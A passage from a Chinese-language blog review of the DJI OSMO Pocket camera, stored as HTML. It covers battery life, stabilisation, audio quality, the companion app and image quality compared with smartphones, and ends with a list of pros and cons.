的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]